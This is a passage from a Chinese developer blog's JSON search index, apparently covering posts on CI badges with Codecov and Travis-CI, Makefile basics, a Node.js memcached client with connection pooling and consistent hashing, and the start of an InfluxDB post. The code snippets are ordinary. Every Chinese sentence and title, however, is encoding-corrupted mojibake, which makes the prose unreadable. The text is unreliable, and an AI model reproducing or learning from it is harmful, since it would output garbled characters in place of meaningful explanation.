æ—¶ï¼Œå…¶å°±ä¼šæ‰§è¡Œå•å…ƒæµ‹è¯•ï¼Œå¹¶ä¸”è·å–æµ‹è¯•è¦†ç›–ç‡ï¼Œç»“æœç±»ä¼¼äº: $ npm test \u003e nyc ava 4 tests passed --------------|----------|----------|----------|----------|-------------------| File | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s | --------------|----------|----------|----------|----------|-------------------| All files | 72.07 | 63.37 | 79.49 | 72.07 | | memcached.js | 72.59 | 64.37 | 74.19 | 72.59 |... 13,419,428,439 | utils.js | 68 | 57.14 | 100 | 68 |... 70,72,73,75,76 | --------------|----------|----------|----------|----------|-------------------| ","date":"2019-12-21","objectID":"/ava-codecov-travis/:2:1","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"Codecov æµ‹è¯•è¦†ç›–ç‡ä¹Ÿæœ‰äº†ï¼Œä½†è¿™åªæ˜¯æœ¬åœ°çš„ï¼Œæˆ‘ä»¬è¿˜ä¸èƒ½ç”Ÿæˆ è¿™ç§å¾½ç« ã€‚ ä¸ºæ­¤ï¼Œæœ¬æ–‡é€‰æ‹©äº† codecov å¹³å°ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ GitHub è´¦å·ç™»å½• codecov å¹¶å…³è”æˆ‘ä»¬çš„ repository åº“ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ª token ä»¤ç‰Œä»¥ä¾¿åç»­ä½¿ç”¨ã€‚ å®‰è£… codecov : npm install --save-dev codecov åœ¨ package.json æ–‡ä»¶ä¸­å¢åŠ ä¸€ä¸ªä¸ŠæŠ¥æµ‹è¯•è¦†ç›–ç‡çš„è„šæœ¬: { \"scripts\": { \"report-coverage\": \"nyc report --reporter=text-lcov \u003e coverage.lcov \u0026\u0026 codecov\" } } ä¸ŠæŠ¥æµ‹è¯•è¦†ç›–ç‡çš„ç»“æœç»™ codecov æ˜¯éœ€è¦æƒé™çš„ï¼Œè¿™é‡Œçš„æƒé™éœ€è¦é…ç½®ç¯å¢ƒå˜é‡ CODECOV_TOKEN=\u003ctoken\u003e ï¼Œtoken å°±æ˜¯åˆšåˆšåœ¨ codecov å¹³å°ä¸Šè®¾ç½®çš„ä»¤ç‰Œï¼Œç„¶åæ‰§è¡Œ npm run report-coverage æ‰ä¼šæˆåŠŸã€‚ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:3:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"Travis-ci æœ¬æ–‡ä½¿ç”¨ travis-ci æ¥åšæŒç»­é›†æˆï¼ŒåŒæ ·çš„ä½ éœ€è¦ä½¿ç”¨ GitHub è´¦å·ç™»å½• travis-ci å¹¶å…³è”æˆ‘ä»¬çš„ repository åº“ã€‚ ç¼–å†™ .travis.yml é…ç½®æ–‡ä»¶: language: node_js node_js: - \"12\" sudo: required before_install: sudo apt-get install libevent-dev -y install: - wget -O memcached.tar.gz http://memcached.org/files/memcached-1.5.20.tar.gz - tar -zxvf memcached.tar.gz - cd memcached-1.5.20 - ./configure \u0026\u0026 make \u0026\u0026 sudo make install - memcached -d script: - npm ci \u0026\u0026 npm test \u0026\u0026 npm run report-coverage language : å£°æ˜è¯­è¨€ç¯å¢ƒï¼Œè¿™é‡Œçš„ node_js è¿˜å£°æ˜äº†ç‰ˆæœ¬ã€‚ sudo : å£°æ˜åœ¨ CI çš„è™šæ‹Ÿç¯å¢ƒä¸­æ˜¯å¦éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ before_install : å®‰è£…é¢å¤–çš„ç³»ç»Ÿä¾èµ–ã€‚ install : ç¤ºä¾‹ä¸­å¦å¤–å®‰è£…äº† memcached å¹¶åœ¨åå°å¯åŠ¨ï¼Œå› ä¸ºæœ¬æ–‡çš„æµ‹è¯•éœ€è¦ã€‚ script : å£°æ˜ CI æ‰§è¡Œçš„è„šæœ¬å‘½ä»¤ã€‚ ç”±äºæˆ‘ä»¬åœ¨ travis-ci ä¸Šæ‰§è¡Œ npm run report-coverage å‘ codecov ä¸ŠæŠ¥æµ‹è¯•è¦†ç›–ç‡æ—¶éœ€è¦å…¶æƒé™ï¼Œå› æ­¤è¿˜éœ€è¦åœ¨ travis-ci çš„ Settings ä¸­è®¾ç½®ç¯å¢ƒå˜é‡ CODECOV_TOKEN ã€‚ æœ€åï¼Œå½“æˆ‘ä»¬å‘ GitHub åº“ä¸­æäº¤äº†æ–°çš„å†…å®¹åï¼Œå°±ä¼šè§¦å‘ CI æµç¨‹ï¼Œè™šæ‹ŸåŒ–ç¯å¢ƒã€å®‰è£…ä¾èµ–ã€æ‰§è¡Œå‘½ä»¤ç­‰ç­‰ï¼ŒCI é€šè¿‡åå°±å¯ä»¥å¾—åˆ° å¾½ç« äº†ã€‚ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:4:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"ç»“è¯­ shields.io å¾½ç« æœ‰å¤šç§ï¼Œæ ¹æ®ä½ çš„éœ€è¦è¿›è¡Œç›¸åº”çš„é…ç½®å³å¯ï¼Œæœ¬æ–‡ä½¿ç”¨äº† codecov å’Œ travis-ci ä½œä¸ºç¤ºä¾‹ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„å¹³å°ä»»ç”±ä½ é€‰ã€‚ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:5:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","date":"2019-12-15","objectID":"/makefile/","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›† make æ˜¯ä¸€ä¸ªå†å²æ‚ ä¹…çš„æ„å»ºå·¥å…·ï¼Œé€šè¿‡é…ç½® Makefile æ–‡ä»¶å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨ä½ è‡ªå·±è‡ªå®šä¹‰çš„å„ç§æŒ‡ä»¤é›†ï¼Œä¸”ä¸å…·ä½“çš„ç¼–ç¨‹è¯­è¨€æ— å…³ã€‚ ä¾‹å¦‚é…ç½®å¦‚ä¸‹çš„ Makefile : run dev: NODE_ENV=development nodemon server.js è¿™æ ·å½“ä½ åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ make run dev æ—¶å…¶å®å°±ä¼šæ‰§è¡Œ NODE_ENV=development nodemon server.js æŒ‡ä»¤ã€‚ ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†å¯ä»¥å¾ˆå¤§çš„æå‡å·¥ä½œæ•ˆç‡ã€‚ ","date":"2019-12-15","objectID":"/makefile/:0:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"Makefile åŸºæœ¬è¯­æ³• \u003ctarget\u003e: \u003cprerequisites\u003e \u003ccommands\u003e target å…¶å®å°±æ˜¯æ‰§è¡Œçš„ç›®æ ‡ï¼Œprerequisites æ˜¯æ‰§è¡Œè¿™æ¡æŒ‡ä»¤çš„å‰ç½®æ¡ä»¶ï¼Œcommands å°±æ˜¯å…·ä½“çš„æŒ‡ä»¤å†…å®¹ã€‚ ç¤ºä¾‹ï¼š build: clean go build -o myapp main.go clean: rm -rf myapp è¿™é‡Œçš„ build æœ‰ä¸€ä¸ªå‰ç½®æ¡ä»¶ clean ï¼Œæ„æ€å°±æ˜¯å½“ä½ æ‰§è¡Œ make build æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œ clean çš„æŒ‡ä»¤å†…å®¹ rm -rf myapp ï¼Œç„¶åå†æ‰§è¡Œ build çš„å†…å®¹ go build -o myapp main.go ã€‚ ","date":"2019-12-15","objectID":"/makefile/:1:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"å˜é‡ è‡ªå®šä¹‰å˜é‡ï¼Œç¤ºä¾‹ï¼š APP=myapp build: clean go build -o ${APP} main.go clean: rm -rf ${APP} ","date":"2019-12-15","objectID":"/makefile/:2:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"PHONY ä¸Šä¾‹ä¸­çš„å®šä¹‰äº† target ç›®æ ‡æœ‰ build å’Œ clean ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸­æ­£å¥½æœ‰ä¸€ä¸ªæ–‡ä»¶å«åš build æˆ– cleanï¼Œé‚£ä¹ˆå…¶æŒ‡ä»¤å†…å®¹ä¸ä¼šæ‰§è¡Œï¼Œè¿™æ˜¯å› ä¸º make ä¼šæŠŠ target è§†ä¸ºæ–‡ä»¶ï¼Œåªæœ‰å½“æ–‡ä»¶ä¸å­˜åœ¨æˆ–å‘ç”Ÿæ”¹å˜æ—¶æ‰ä¼šå»æ‰§è¡Œå‘½ä»¤ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ PHONY å£°æ˜ target å…¶å®æ˜¯ä¼ªç›®æ ‡ï¼š APP=myapp .PHONY: build build: clean go build -o ${APP} main.go .PHONY: clean clean: rm -rf ${APP} å¤šä¸ª PHONY ä¹Ÿå¯ä»¥ç»Ÿä¸€å£°æ˜åœ¨ä¸€è¡Œä¸­: .PHONY: build clean ","date":"2019-12-15","objectID":"/makefile/:3:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"é€’å½’çš„ç›®æ ‡ å‡è®¾æˆ‘ä»¬çš„å·¥ç¨‹ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š ~/project â”œâ”€â”€ main.go â”œâ”€â”€ Makefile â””â”€â”€ mymodule/ â”œâ”€â”€ main.go â””â”€â”€ Makefile æ–‡ä»¶æ ¹ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ mymoduleï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—ï¼Œä¹Ÿéœ€è¦æ‰“åŒ…æ„å»ºï¼Œå¹¶ä¸”å®šä¹‰æœ‰è‡ªå·±çš„ Makefile : # ~/project/mymodule/Makefile APP=module build: go build -o ${APP} main.go ç°åœ¨å½“ä½ å¤„äºé¡¹ç›®çš„æ ¹ç›®å½•æ—¶ï¼Œå¦‚ä½•å»æ‰§è¡Œ mymodule å­ç›®å½•ä¸‹å®šä¹‰çš„ Makefile å‘¢ï¼Ÿ ä½¿ç”¨ cd å‘½ä»¤ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡æˆ‘ä»¬æœ‰å…¶å®ƒçš„æ–¹å¼å»è§£å†³è¿™ä¸ªé—®é¢˜ï¼šä½¿ç”¨ -C æ ‡å¿—å’Œç‰¹å®šçš„ ${MAKE} å˜é‡ã€‚ ä¿®æ”¹é¡¹ç›®æ ¹ç›®å½•ä¸­çš„ Makefile ä¸ºï¼š APP=myapp .PHONY: build build: clean go build -o ${APP} main.go .PHONY: clean clean: rm -rf ${APP} .PHONY: build-mymodule build-mymodule: ${MAKE} -C mymodule build è¿™æ ·ï¼Œå½“ä½ æ‰§è¡Œ make build-mymodule æ—¶ï¼Œå…¶å°†ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ° mymodule ç›®å½•ï¼Œå¹¶ä¸”æ‰§è¡Œ mymodule ç›®å½•ä¸‹çš„ Makefile ä¸­å®šä¹‰çš„ build æŒ‡ä»¤ã€‚ ","date":"2019-12-15","objectID":"/makefile/:4:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"shell è¾“å‡ºä½œä¸ºå˜é‡ æˆ‘ä»¬å¯ä»¥æŠŠ shell ä¸­æ‰§è¡Œçš„æŒ‡ä»¤çš„è¾“å‡ºä½œä¸ºå˜é‡ï¼š V=$(shell go version) gv: echo ${V} è¿™é‡Œæ‰§è¡Œ make gv å°±ä¼šå…ˆæ‰§è¡Œ go version æŒ‡ä»¤ç„¶åæŠŠè¾“å‡ºçš„å†…å®¹èµ‹å€¼ç»™å˜é‡ V ã€‚ ","date":"2019-12-15","objectID":"/makefile/:5:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"åˆ¤æ–­è¯­å¥ å‡è®¾æˆ‘ä»¬çš„æŒ‡ä»¤ä¾èµ–äºç¯å¢ƒå˜é‡ ENV ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå‰ç½®æ¡ä»¶å»æ£€æŸ¥æ˜¯å¦å¿˜äº†è¾“å…¥ ENV ï¼š .PHONY: run run: check-env echo ${ENV} check-env: ifndef ENV $(error ENV not set, allowed values - `staging` or `production`) endif è¿™é‡Œå½“æˆ‘ä»¬æ‰§è¡Œ make run æ—¶ï¼Œå› ä¸ºæœ‰å‰ç½®æ¡ä»¶ check-env ä¼šå…ˆæ‰§è¡Œå‰ç½®æ¡ä»¶ä¸­çš„å†…å®¹ï¼ŒæŒ‡ä»¤å†…å®¹æ˜¯ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œåˆ¤æ–­ ENV æ˜¯å¦æœªå®šä¹‰ï¼Œå¦‚æœæœªå®šä¹‰ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œé”™è¯¯æç¤ºå°±æ˜¯ error åé¢çš„å†…å®¹ã€‚ ","date":"2019-12-15","objectID":"/makefile/:6:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"å¸®åŠ©æç¤º æ·»åŠ  help å¸®åŠ©æç¤ºï¼š .PHONY: build ## build: build the application build: clean @echo \"Building...\" @go build -o ${APP} main.go .PHONY: run ## run: runs go run main.go run: go run -race main.go .PHONY: clean ## clean: cleans the binary clean: @echo \"Cleaning\" @rm -rf ${APP} .PHONY: setup ## setup: setup go modules setup: @go mod init \\ \u0026\u0026 go mod tidy \\ \u0026\u0026 go mod vendor .PHONY: help ## help: prints this help message help: @echo \"Usage: \\n\" @sed -n 's/^##//p' ${MAKEFILE_LIST} | column -t -s ':' | sed -e 's/^/ /' è¿™æ ·å½“ä½ æ‰§è¡Œ make help æ—¶ï¼Œå°±æ˜¯æ‰“å°å¦‚ä¸‹çš„æç¤ºå†…å®¹ï¼š Usage: build build the application run runs go run main.go clean cleans the binary setup setup go modules help prints this help message ","date":"2019-12-15","objectID":"/makefile/:7:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"å‚è€ƒèµ„æ–™ https://danishpraka.sh/2019/12/07/using-makefiles-for-go.html http://www.ruanyifeng.com/blog/2015/02/make.html https://www.gnu.org/software/make/manual/make.html ","date":"2019-12-15","objectID":"/makefile/:8:0","tags":[],"title":"ä½¿ç”¨ Makefile æ„å»ºæŒ‡ä»¤é›†","uri":"/makefile/"},{"categories":["Uncate"],"content":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","date":"2019-12-09","objectID":"/create-memcached-client/","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["Uncate"],"content":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®ã€‚ åºŸè¯ä¸å¤šè¯´ï¼Œæ–‡æœ¬å°†å¸¦ä½ å®ç°ä¸€ä¸ªç®€å•çš„ memcached å®¢æˆ·ç«¯ã€‚ ","date":"2019-12-09","objectID":"/create-memcached-client/:0:0","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["Uncate"],"content":"é›†ç¾¤ï¼šä¸€è‡´æ€§å“ˆå¸Œ memcached æœ¬èº«å¹¶ä¸æ”¯æŒé›†ç¾¤ï¼Œä¸ºäº†ä½¿ç”¨é›†ç¾¤ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±åœ¨å®¢æˆ·ç«¯å®ç°è·¯ç”±åˆ†å‘ï¼Œå°†ç›¸åŒçš„ key è·¯ç”±åˆ°åŒä¸€å° memcached ä¸Šå»å³å¯ã€‚ è·¯ç”±ç®—æ³•æœ‰å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ã€‚ ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•çš„åŸç†ï¼š ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å·²ç»æœ‰å¼€æºåº“ hashring å®ç°ï¼ŒåŸºæœ¬ç”¨æ³•ï¼š const HashRing = require('hashring'); // è¾“å…¥é›†ç¾¤åœ°å€æ„é€  hash ring const ring = new HashRing(['127.0.0.1:11211', '127.0.0.2:11211']); // è¾“å…¥ key è·å–æŒ‡å®šèŠ‚ç‚¹ const host = ring.get(key); ","date":"2019-12-09","objectID":"/create-memcached-client/:1:0","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["Uncate"],"content":"TCP ç¼–ç¨‹ åŒ…æ‹¬ memcached åœ¨å†…çš„è®¸å¤šç³»ç»Ÿå¯¹å¤–éƒ½æ˜¯é€šè¿‡ TCP é€šä¿¡ã€‚åœ¨ Node.js ä¸­å»ºç«‹ä¸€ä¸ª TCP è¿æ¥å¹¶è¿›è¡Œæ•°æ®çš„æ”¶å‘å¾ˆç®€å•ï¼š const net = require('net'); const socket = new net.Socket(); socket.connect({ host: host, // ç›®æ ‡ä¸»æœº port: port, // ç›®æ ‡ç«¯å£ // localAddress: localAddress, // æœ¬åœ°åœ°å€ // localPort: localPort, // æœ¬åœ°ç«¯å£ }); socket.setKeepAlive(true); // ä¿æ´» // è¿æ¥ç›¸å…³ socket.on('connect', () =\u003e { console.log(`socket connected`); }); socket.on('error', error =\u003e { console.log(`socket error: ${error}`); }); socket.on('close', hadError =\u003e { console.log(`socket closed, transmission error: ${hadError}`); }); socket.on('data', data =\u003e { // æ¥å—æ•°æ® }); socket.write(data); // å‘é€æ•°æ® ä¸€æ¡è¿æ¥ç”±å”¯ä¸€çš„äº”å…ƒç»„ç¡®å®šï¼Œæ‰€è°“çš„äº”å…ƒç»„å°±æ˜¯ï¼šåè®®ï¼ˆæ¯”å¦‚ TCP æˆ–è€… UDPï¼‰ã€æœ¬åœ°åœ°å€ã€æœ¬åœ°ç«¯å£ã€è¿œç¨‹åœ°å€ã€è¿œç¨‹ç«¯å£ã€‚ ç³»ç»Ÿæ­£æ˜¯é€šè¿‡äº”å…ƒç»„å»åŒºåˆ†ä¸åŒçš„è¿æ¥ï¼Œå…¶ä¸­æœ¬åœ°åœ°å€å’Œæœ¬åœ°ç«¯å£ç”±äºåœ¨ç¼ºçœæƒ…å†µä¸‹ä¼šè‡ªåŠ¨ç”Ÿæˆï¼Œå¸¸å¸¸ä¼šè¢«æˆ‘ä»¬å¿½è§†ã€‚ ","date":"2019-12-09","objectID":"/create-memcached-client/:2:0","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["Uncate"],"content":"è¿æ¥æ±  ä¸€æ¬¡å®Œæ•´çš„ TCP é€šä¿¡è¿‡ç¨‹ä¸ºï¼šä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹è¿æ¥ â€“\u003e æ•°æ®ä¼ é€’ â€“\u003e æŒ¥æ‰‹ï¼Œå…³é—­è¿æ¥ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“æ¡æ‰‹å»ºç«‹è¿æ¥çš„è¿‡ç¨‹æ˜¯éå¸¸æ¶ˆè€—èµ„æºçš„ï¼Œè€Œè¿æ¥æ± å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿æ¥æ± æ˜¯ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œå®ƒåŒ…æ‹¬ï¼š å»ºç«‹è¿æ¥ï¼Œå°†è¿æ¥æ”¾å…¥æ± ä¸­ã€‚ éœ€è¦ä½¿ç”¨è¿æ¥æ—¶ï¼ˆè¿›è¡Œæ•°æ®æ”¶å‘ï¼‰ï¼Œä»è¿æ¥æ± ä¸­å–å‡ºè¿æ¥ã€‚ è¿æ¥ä½¿ç”¨å®Œæˆåï¼Œå°†è¿æ¥æ”¾å›åˆ°æ± ä¸­ã€‚ å…¶å®ƒã€‚ å¯ä»¥çœ‹åˆ°æ‰€è°“çš„è¿æ¥æ± å…¶å®å°±æ˜¯åœ¨è¿æ¥ä½¿ç”¨å®Œæˆåå¹¶ä¸æ˜¯ç«‹å³å…³é—­è¿æ¥ï¼Œè€Œæ˜¯è®©è¿æ¥ä¿æ´»ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡ä½¿ç”¨ï¼Œä»è€Œé¿å…åå¤å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ã€‚ æ­£å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè¿æ¥æ± æ˜¯ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥ä½¿ç”¨å¼€æºåº“ generic-pool ã€‚ æ± åŒ– TCP è¿æ¥ç¤ºä¾‹ï¼š const net = require('net'); const genericPool = require('generic-pool'); // è‡ªå®šä¹‰åˆ›å»ºè¿æ¥æ± çš„å‡½æ•° function _buildPool(remote_server) { const factory = { create: function () { return new Promise((resolve, reject) =\u003e { const host = remote_server.split(':')[0]; const port = remote_server.split(':')[1]; const socket = new net.Socket(); socket.connect({ host: host, // ç›®æ ‡ä¸»æœº port: port, // ç›®æ ‡ç«¯å£ }); socket.setKeepAlive(true); socket.on('connect', () =\u003e { console.log(`socket connected: ${remote_server} , local: ${socket.localAddress}:${socket.localPort}`); resolve(socket); }); socket.on('error', error =\u003e { console.log(`socket error: ${remote_server} , ${error}`); reject(error); }); socket.on('close', hadError =\u003e { console.log(`socket closed: ${remote_server} , transmission error: ${hadError}`); }); }); }, destroy: function (socket) { return new Promise((resolve) =\u003e { socket.destroy(); resolve(); }); }, validate: function (socket) { // validate socket return new Promise((resolve) =\u003e { if (socket.connecting || socket.destroyed || !socket.readable || !socket.writable) { return resolve(false); } else { return resolve(true); } }); } }; const pool = genericPool.createPool(factory, { max: 10, // æœ€å¤§è¿æ¥æ•° min: 0, // æœ€å°è¿æ¥æ•° testOnBorrow: true, // ä»æ± ä¸­å–è¿æ¥æ—¶è¿›è¡Œ validate å‡½æ•°éªŒè¯ }); return pool; } // è¿æ¥æ± åŸºæœ¬ä½¿ç”¨ const pool = _buildPool('127.0.0.1:11211'); // æ„å»ºè¿æ¥æ±  const s = await pool.acquire(); // ä»è¿æ¥æ± ä¸­å–è¿æ¥ await pool.release(s); // ä½¿ç”¨å®Œæˆåé‡Šæ”¾è¿æ¥ ","date":"2019-12-09","objectID":"/create-memcached-client/:3:0","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["Uncate"],"content":"å¯¹æ¥è‡ªå®šä¹‰åè®® åŒ…æ‹¬ memcached åœ¨å†…çš„è®¸å¤šç³»ç»Ÿéƒ½å®šä¹‰äº†ä¸€å¥—è‡ªå·±çš„åè®®ç”¨äºå¯¹å¤–é€šä¿¡ï¼Œä¸ºäº†å®ç° memcached å®¢æˆ·ç«¯å½“ç„¶å°±è¦éµå®ˆå®ƒçš„åè®®å†…å®¹ã€‚ memcached å®¢æˆ·ç«¯åè®®ï¼Œæˆ‘ä»¬å®ç°æœ€ç®€å•çš„ get æ–¹æ³•: å‘é€çš„æ•°æ®æ ¼å¼: get \u003ckey\u003e\\r\\n æ¥å—çš„æ•°æ®æ ¼å¼: VALUE \u003ckey\u003e \u003cflags\u003e \u003cbytes\u003e\\r\\n \u003cdata block\u003e\\r\\n å®ç°ç¤ºä¾‹ï¼š // å®šä¹‰ä¸€ä¸ªè¯·æ±‚æ–¹æ³•å¹¶è¿”å›å“åº”æ•°æ® function _request(command) { return new Promise(async (resolve, reject) =\u003e { try { // ...è¿™é‡Œçœç•¥äº†è¿æ¥æ± æ„å»ºç›¸å…³éƒ¨åˆ† const s = await pool.acquire(); // å–è¿æ¥ const bufs = []; s.on('data', async buf =\u003e { // ç›‘å¬ data äº‹ä»¶æ¥å—å“åº”æ•°æ® bufs.push(buf); const END_BUF = Buffer.from('\\r\\n'); // æ•°æ®æ¥å—å®Œæˆçš„ç»“æŸä½ if (END_BUF.equals(buf.slice(-2))) { s.removeAllListeners('data'); // ç§»é™¤ç›‘å¬ try { await pool.release(s); // é‡Šæ”¾è¿æ¥ } catch (error) { } const data = Buffer.concat(bufs).toString(); return resolve(data); } }); s.write(command); } catch (error) { return reject(error); } }); } // get function get(key) { return new Promise(async (resolve, reject) =\u003e { try { const command = `get ${key}\\r\\n`; const data = await _request(key, command); // ...å“åº”æ•°æ®çš„å¤„ç†ï¼Œæ³¨æ„æœ‰çœç•¥ // key not exist if (data === 'END\\r\\n') { return resolve(undefined); } /* VALUE \u003ckey\u003e \u003cflags\u003e \u003cbytesLength\u003e\\r\\n \u003cdata block\u003e\\r\\n */ const data_arr = data.split('\\r\\n'); const response_line = data_arr[0].split(' '); const value_flag = response_line[2]; const value_length = Number(response_line[3]); let value = data_arr.slice(1, -2).join(''); value = unescapeValue(value); // unescape \\r\\n // ...æœ‰çœç•¥ return resolve(value); } catch (error) { return reject(error); } }); } ä»¥ä¸Šç¤ºä¾‹éƒ½å•ç‹¬æ‹¿å‡ºæ¥äº†ï¼Œå…¶å®æ˜¯åœ¨æ•´åˆåœ¨ä¸€ä¸ª class ä¸­çš„ï¼š class Memcached { constructor(serverLocations, options) { this._configs = { ...{ pool: { max: 1, min: 0, idle: 30000, // 30000 ms. }, timeout: 5000, // timeout for every command, 5000 ms. retries: 5, // max retry times for failed request. maxWaitingClients: 10000, // maximum number of queued requests allowed }, ...options }; this._hashring = new HashRing(serverLocations); this._pools = {}; // é€šè¿‡ k-v çš„å½¢å¼å­˜å‚¨å…·ä½“çš„åœ°å€åŠå®ƒçš„è¿æ¥æ±  } _buildPool(remote_server) { // ... } _request(key, command) { // ... } // get async get(key) { // ... } // ... å…¶ä»–æ–¹æ³• } // ä½¿ç”¨å®ä¾‹ const memcached = new Memcached(['127.0.0.1:11211'], { pool: { max: 10, min: 0 } }); const key = 'testkey'; const result = await memcached.get(key); å®Œæ•´çš„ç¤ºä¾‹å¯ä»¥çœ‹ io-memcached ã€‚ ","date":"2019-12-09","objectID":"/create-memcached-client/:4:0","tags":["Node.js","Memcached"],"title":"å®ç° memcached å®¢æˆ·ç«¯ï¼šTCPã€è¿æ¥æ± ã€ä¸€è‡´æ€§å“ˆå¸Œã€è‡ªå®šä¹‰åè®®","uri":"/create-memcached-client/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰","date":"2019-11-17","objectID":"/7/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰","uri":"/7/"},{"categories":["InfluxDB"],"content":" å•ç‚¹æ•…éšœå’Œå®¹ç¾å¤‡ä»½ InfluxDB å¼€æºçš„ç¤¾åŒºç‰ˆæœ¬é¢ä¸´çš„æœ€å¤§çš„é—®é¢˜å°±æ˜¯å•ç‚¹æ•…éšœå’Œå®¹ç¾å¤‡ä»½ï¼Œæœ‰æ²¡æœ‰ä¸€ä¸ªç®€å•çš„æ–¹æ¡ˆå»è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ 